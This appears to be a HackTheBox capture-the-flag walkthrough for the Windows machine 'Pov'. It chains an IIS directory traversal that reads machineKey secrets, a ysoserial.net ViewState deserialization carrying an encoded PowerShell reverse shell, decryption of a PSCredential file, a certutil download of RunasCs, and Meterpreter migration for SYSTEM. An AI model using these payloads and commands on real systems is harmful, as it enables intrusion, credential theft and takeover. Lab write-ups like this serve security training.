---
title: "Pov - HackTheBox"
description: "Directory traversal sur IIS pour lire la machineKey, désérialisation ViewState pour un shell, puis migration Meterpreter via SeDebugPrivilege."
date: 2026-02-03
tags: ["lfi", "viewstate", "deserialization", "sedebuggrivilege", "windows", "medium"]
draft: false
---

![alt text](./images/{CCA311EE-E6C9-4768-9FE8-1AEBA9AF0F1B}.png)
# nmap

| Port | service | Informations   |
| ---- | ------- | -------------- |
| 80   | http    | IIS httpd 10.0 |
**OS Windows server**
# Enumeration
## Web service - port 80
### Web dir enum
```bash
gobuster dir -u http://10.129.230.183/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt
-> Nothing interesting
```
### Subdomain enum
-> Guessing for domain: pov.htb
```bash
ffuf -u http://10.129.230.183 -H 'Host: FUZZ.pov.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 12330
-> dev
```
### dev.pov.htb enum
```bash
feroxbuster -u "http://dev.pov.htb/" -x aspx
```
***Finding: File Read changing &file parameter***
```makefile
POST /portfolio/default.aspx HTTP/1.1
Host: dev.pov.htb
<SNIP>
__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=EBjwzrmO9MHJRU6MuVLlkILOA9OU2eRmpoIun73nIXYjd1keu2gZOEcyaSx12nrjhzYhH43ufRnixaBSkd%2BsKCzKGDE%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=2Xtc%2Bu3j17WXYkdXzqyK7KFBHtxz%2FMWqOKq4CKOfHXhH2%2BenpldaLKl%2FP9OHYaIgXDK%2FgZ8AF864LWf70G5b7E9HcbeOViUSXi5Ru%2FOZAyCVP7dqnReTP7L49CSQfp3sNKWTvQ%3D%3D&file=default.aspx
```
default.aspx page is a static page, but it called .cs page: index.aspx.cs
```aspx
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="index.aspx.cs" Inherits="index"%>
```
index.aspx.cs
```csharp
using System;
using System.Collections.Generic;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Text.RegularExpressions;
using System.Text;
using System.IO;
using System.Net;

public partial class index : System.Web.UI.Page {
    protected void Page_Load(object sender, EventArgs e) {

    }
    
    protected void Download(object sender, EventArgs e) {
            
        var filePath = file.Value;
        filePath = Regex.Replace(filePath, "../", ""); // HERE WE ARE OUR DIRECTORY TRAVERSAL FD
        Response.ContentType = "application/octet-stream";
        Response.AppendHeader("Content-Disposition","attachment; filename=" + filePath);
        Response.TransmitFile(filePath);
        Response.End();
        
    }
}
```
***Finding 2: DIRECTORY traversal***
>  Method 1: Using relative Path or method 2: use `....//` payload or `..\`
>  **Good to Know:** IIS don't let us go outside root directory with relative PATH

Now we have our file disclosure vulnerability:
```lua
&file=..\web.config
-> 
<machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"
validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
/>
```
### View State exploitation
We are going to use [this repo => ysoserial.net](https://github.com/pwntester/ysoserial.net)
-> lets get revershell
```powershell
ysoserial.exe -p ViewState -g WindowsIdentity --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio" -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA0ADAAIgAsADkAMAAwADIAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
# On my machine:
rlwrap nc -lnvp 9002
```
Now update VIEWSTATE field in the request:

# Post-Exploitation
Shell as sfitz with exploitation of VIEWSTATE parameter
```powershell
PS C:\users\sfitz\documents> ls
connection.xml => PSCredential file for alaading
```
```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>
```
## Decrypt PSCredential
```powershell
$cred= Import-CliXml -Path connection.xml
$cred.GetNetworkCredential().Password
f8gQ8fynP44ek1m3
```
New user:
```creds
alaading:f8gQ8fynP44ek1m3
```
-> Lets download Runas.cs to run commande as alaading:
```powershell
certutil -urlcache -f http://10.10.14.240/RunasCs.exe RunasCs.exe
-> rlwrap nc -lnvp 443
.\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.14.240:443
```
## Shell as Administrator
**SeDebugPrivilege** -> ENABLED
### Using meterpreter
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=9001 -f exe -o rev.exe
msfconsole
use exploit/multi/handler
handler > run
-> then launch our exploit on the target
.\rev.exe
-> get the reverse shell
meterpreter > getpid # list ps and get pid of process running as SYSTEM
meterpreter > migrate 548
We are NT authority\SYSTEM
```
